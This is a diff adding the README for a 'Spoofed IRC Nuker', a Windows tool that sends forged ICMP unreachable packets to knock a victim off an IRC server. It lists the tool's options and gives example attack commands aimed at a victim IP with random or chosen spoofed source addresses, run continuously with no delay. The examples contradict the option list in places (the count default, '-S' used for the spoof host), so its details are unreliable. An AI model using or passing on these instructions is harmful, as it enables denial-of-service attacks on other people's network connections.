@@ -1,0 +1,60 @@
+
+  Spoofed IRC Nuker Version 1.3
+  =============================
+
+  This program is a spoofed irc nuker.
+
+  Note: This program is only tested on Windows XP.
+
+
+  I. USAGE
+  =============================
+
+  sin.exe <client> <server> [options]
+
+  Options:
+    -C:    Client port range (format: 1024-4000 (default))
+    -S:    Server port range (format: 6667-6667 (default))
+    -t:    ICMP type         (default 3)
+    -c:    ICMP code         (default 2)
+    -s:    Spoof host        (0 is random (default))
+    -n:    Num of attacks    (default 1) (0 is continuous)
+    -d:    Delay (in ms)     (default 0)
+
+
+  Example I: sin 217.155.32.170 address.of.the.irc.server
+
+  On this attack:
+
+  - Victim: 217.155.32.170
+  - IRC Server: address.of.the.irc.server
+  - Client Port Range: 1024-4000
+  - Server Port Range: 6667-6667
+  - ICMP Type: 3
+  - ICMP Code: 2
+  - Spoof IP: Random
+  - Count: Continuous
+  - Delay: 0 ms (no delay between packets)
+
+
+  Example II: sin 217.155.32.170 address.of.the.irc.server -C 1024-1500 -S 6666-6669
+              -S address.of.smo.else
+
+  On this attack:
+
+  - Victim: 217.155.32.170
+  - IRC Server: address.of.the.irc.server
+  - Client Port Range: 1024-1500
+  - Server Port Range: 6666-6669
+  - ICMP Type: 3
+  - ICMP Code: 2
+  - Spoof IP/Host: address.of.smo.else
+  - Count: Continuous
+  - Delay: 0 ms (no delay between packets)
+
+
+  II. CONTACT
+  =============================
+  MSN: metinsdr@hotmail.com
+  UIN: 470734
+
